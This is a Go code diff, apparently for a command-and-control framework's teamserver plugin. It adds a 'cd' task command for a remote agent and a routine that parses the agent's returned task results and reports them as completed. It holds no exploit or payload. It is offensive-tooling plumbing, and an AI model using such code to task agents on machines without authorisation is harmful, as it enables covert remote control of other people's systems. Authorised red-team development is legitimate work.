@@ -1,7 +1,9 @@
 package main
 
 import (
+	"bytes"
 	"encoding/binary"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"strconv"
@@ -113,10 +115,18 @@ func CreateTask(agent AgentData, command string, args map[string]any) (TaskData,
 		array    []interface{}
 		packData []byte
 		err      error
-		taskType int = TYPE_TASK
+		taskType TaskType = TASK
 	)
 
 	switch command {
+
+	case "cd":
+		path, ok := args["path"].(string)
+		if !ok {
+			return taskData, errors.New("parameter 'path' must be set")
+		}
+		array = []interface{}{8, ConvertUTF8toCp(path, agent.ACP)}
+		break
 
 	case "cp":
 		src, ok := args["src"].(string)
@@ -153,7 +163,7 @@ func CreateTask(agent AgentData, command string, args map[string]any) (TaskData,
 	}
 
 	taskData = TaskData{
-		TaskType: taskType,
+		Type:     taskType,
 		TaskData: packData,
 		Sync:     true,
 	}
@@ -161,4 +171,38 @@ func CreateTask(agent AgentData, command string, args map[string]any) (TaskData,
 	/// END CODE
 
 	return taskData, nil
+}
+
+func ProcessTasksResult(ts Teamserver, agentData AgentData, cTaskData ComplitedTaskData, packedData []byte) {
+
+	packer := CreatePacker(packedData)
+	size := packer.ParseInt32()
+	if size-4 != packer.Size() {
+		fmt.Println("Invalid tasks data")
+	}
+
+	for packer.Size() >= 8 {
+		var taskObject bytes.Buffer
+
+		TaskId := packer.ParseInt32()
+		commandId := packer.ParseInt32()
+
+		task := cTaskData
+		task.TaskId = fmt.Sprintf("%08x", TaskId)
+
+		switch commandId {
+
+		case 4:
+			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+			task.Message = "Task completed"
+			task.ClearText = path
+
+		default:
+			continue
+		}
+
+		_ = json.NewEncoder(&taskObject).Encode(task)
+		ts.AgentTaskComplete(agentData.Id, taskObject.Bytes(), true)
+	}
+
 }
